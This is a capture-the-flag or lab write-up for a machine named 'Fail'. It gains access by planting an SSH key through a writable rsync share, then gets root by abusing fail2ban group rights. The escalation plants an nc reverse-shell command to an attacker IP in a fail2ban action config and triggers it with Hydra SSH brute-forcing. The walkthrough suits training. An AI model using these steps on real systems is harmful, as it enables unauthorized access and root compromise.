---
icon: ubuntu
---

# Fail - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.178.126 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 08:12 EDT
Nmap scan report for 192.168.178.126
Host is up (0.028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
873/tcp open  rsync   (protocol version 31)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   26.97 ms 192.168.45.1
2   26.98 ms 192.168.45.254
3   27.17 ms 192.168.251.1
4   28.49 ms 192.168.178.126
```

### <mark style="color:$primary;">Rsync Enumeration</mark>

```bash
nmap -sV --script "rsync-list-modules" -p 873 192.168.178.126
```

<figure><img src="../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

fox looks like the user on this machine, let's try to list present files

```bash
rsync -av --list-only rsync://fox@192.168.178.126/fox
```

<figure><img src="../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>

I can create a .ssh directory and place a generate public key in it

```bash
mkdir .ssh
cd .ssh
ssh-keygen -t rsa -b 2048 -f ./id_rsa -N ""
cat id_rsa.pub >> authorized_keys
chmod 600 authorized_keys
cd ..
rsync -av .ssh rsync://fox@192.168.178.126/fox
```

<figure><img src="../../.gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Fail2ban Group</mark>

<figure><img src="../../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>

fox is in the fail2ban group and can edit the fail2ban configuration files to execute commands as root&#x20;

We can create a malicious iptables-multiport.conf where we have actionban give us a reverse shell

```editorconfig
actionban = nc 192.168.45.158 80 -e /bin/bash
```

```editorconfig
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = nc 192.168.45.158 80 -e /bin/bash
# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
[Init]
```

Now lets replace the original file with our malicious one

<figure><img src="../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>

Now to trigger it just generate a lot of failed ssh attempts with hydra:

```bash
hydra -l fox -P /usr/share/wordlists/rockyou.txt 192.168.178.126 ssh
```

<figure><img src="../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>

And we are root!
